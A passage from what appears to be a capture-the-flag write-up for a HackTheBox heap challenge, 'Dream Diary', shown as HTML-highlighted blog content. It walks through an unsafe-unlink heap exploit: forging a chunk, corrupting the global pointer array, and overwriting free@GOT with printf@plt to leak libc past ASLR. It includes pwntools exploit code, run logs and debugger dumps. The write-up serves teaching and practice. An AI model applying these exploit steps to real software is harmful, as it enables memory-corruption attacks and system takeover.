+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1c0:</span>	<span class="err">0</span><span class="nf">x0000000000000000</span>	<span class="mi">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1d0:</span>	<span class="err">0</span><span class="nf">x00000000006020c0</span>	<span class="mi">0x00000000006020c8</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1e0:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1f0:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a200:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a210:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a220:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a230:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a240:</span>	<span class="err">0</span><span class="nf">x0000000000000080</span>	<span class="mi">0x0000000000000090</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a250:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a260:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a270:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a280:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a290:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2a0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2b0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2c0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2d0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x0000000000020d31</span>
+</span></span></code></pre></div><p>Here, the our forged chunk is within the 3rd chunk, our <code>fd</code> points to the <code>0x6020c0</code> and the <code>bk</code> to the <code>0x6020c8</code>, this aside, then we modified the <code>prev_size</code> of the chunk <code>0x230a1c0</code> to the <code>0x80</code> as it was <code>0x90</code> before, we did this because, our forged chunk must be considered from the <code>0x230a1c0</code> as from the we have an actual free&rsquo;d chunk structure, then we made <code>prev_inuse</code> bit of the chunk <code>0x230a250</code> equal to the <code>0</code> to consider the chunk as a free&rsquo;d chunk, so when we try to do <code>free(chunk4)</code> it&rsquo;ll consolidate the adjacent chunks, hence doing an unsafe unlink, resulting in the <code>fd</code> of the free&rsquo;d chunk pointing to the <code>0x6020c0</code>.</p>
+<p>Let&rsquo;s free the chunk 4 and see the memory content to make this more clear.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[08:53:07]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">2978</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Preparing</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk...</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Fake</span> <span class="no">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000000:</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">|</span><span class="na">................</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000010:</span>  <span class="nf">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="no">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="err">|</span><span class="p">.</span> <span class="err">`</span><span class="no">......</span> <span class="err">`</span><span class="no">.....</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000020:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000030:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000040:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000050:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000060:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000070:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000080:</span>  <span class="err">80</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">90</span>                       <span class="err">|</span><span class="na">.........</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Editing</span> <span class="no">chunk</span> <span class="mi">3</span> <span class="no">with</span> <span class="no">a</span> <span class="no">fakr</span> <span class="no">chunk</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Triggering</span> <span class="no">Unlink</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Done</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunks</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x2236010</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000002236010</span>     <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>    <span class="no">AAAAAAAAAAAAAAAA</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x22360a0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000022360a0</span>     <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span>    <span class="no">BBBBBBBBBBBBBBBB</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x2236130</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000002236130</span>     <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span>    <span class="no">CCCCCCCCCCCCCCCC</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x22361c0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000022361c0</span>     <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">0</span><span class="no">e</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">........A.......</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x6020c0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020c0:</span>	<span class="err">0</span><span class="nf">x0000000002236010</span>	<span class="mi">0x00000000022360a0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020d0:</span>	<span class="err">0</span><span class="nf">x0000000002236130</span>	<span class="mi">0x00000000006020c0</span>
+</span></span></code></pre></div><p>Now as we see the global array having a pointer to itself on index 3, this means that the chunk 3 is now pointing to the global array itself, let&rsquo;s see what happened under the hood when we did <code>free(4)</code>, I will break it down in following steps:-</p>
+<ul>
+<li>There was a forged free&rsquo;d chunk with the <code>fd</code> and <code>bk</code> pointing to the global array.</li>
+<li>When the <code>free(4)</code> is called and the chunk <code>4</code> was initally freed and the forged chunk was coalesced with the chunk <code>4</code>.</li>
+<li>Once coalesced, the unlink is triggered resulting in the 3rd chunk pointer in the global array being overwritten with the address we wanted it to.</li>
+</ul>
+<p>Now, we have the control over the chunk <code>3</code>, we can edit it and get the other pointer overwritten too, if we could overwrite one of the entry with any GOT address, we can get the control over the binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Changing freegot to print@plt for LIBC Leak&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">(</span><span class="s2">&#34;free&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">(</span><span class="s2">&#34;printf&#34;</span><span class="p">)))</span>
+</span></span></code></pre></div><p>So, from the code above you can see, first we overwrite the pointer returned by the chunk <code>3</code> which would be the global array itself, then we request for the first chunk via the <code>edit</code> function and since the 0th chunk address point to the <code>free@got</code>, we get the pointer of <code>free@GOT</code> and then it is being overwritten with the <code>printf@plt</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span>  <span class="err">[13:09:56]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">1985</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Preparing</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk...</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Fake</span> <span class="no">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000000:</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">|</span><span class="na">................</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000010:</span>  <span class="nf">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="no">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="err">|</span><span class="p">.</span> <span class="err">`</span><span class="no">......</span> <span class="err">`</span><span class="no">.....</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000020:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000030:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000040:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000050:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000060:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000070:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000080:</span>  <span class="err">80</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">90</span>                       <span class="err">|</span><span class="na">.........</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Editing</span> <span class="no">chunk</span> <span class="mi">3</span> <span class="no">with</span> <span class="no">a</span> <span class="no">fakr</span> <span class="no">chunk</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Triggering</span> <span class="no">Unlink</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Changing</span> <span class="no">freegot</span> <span class="no">to</span> <span class="no">print@plt</span> <span class="no">for</span> <span class="no">LIBC</span> <span class="no">Leak</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Done</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="nf">Invalid</span> <span class="no">choice</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
+</span></span><span class="line"><span class="cl"><span class="err">&gt;&gt;</span> <span class="nf">$</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[..</span><span class="no">snip..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0000000000400710</span>  <span class="no">printf@plt</span>
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">got</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">GOT</span> <span class="no">protection</span><span class="p">:</span> <span class="no">Partial</span> <span class="no">RelRO</span> <span class="err">|</span> <span class="no">GOT</span> <span class="no">functions</span><span class="p">:</span> <span class="mi">11</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="err">[0</span><span class="nf">x602018</span><span class="p">]</span> <span class="no">free@GLIBC_2.2.5</span>  <span class="err">→</span>  <span class="mi">0x400710</span>
+</span></span></code></pre></div><p>As you can see, we successfully overwritten the <code>free@got</code> with the PLT address of the <code>printf</code>. Now, we have the <code>printf</code>, as from the reverse engineering, we know that the free is done like <code>free(ptr[index])</code>, as the <code>free</code> is now <code>printf</code>, now it&rsquo;ll do the <code>printf(ptr(index])</code>, as obvious it should be we have a format string vulnerability now, we can leak a LIBC address to defeat ASLR.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Getting __libc_start_main&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;%15$p&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_start_main</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;__libc_start_main+240:    0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_start_main</span> <span class="o">-</span> <span class="mi">240</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">function</span><span class="p">(</span><span class="s2">&#34;__libc_start_main&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
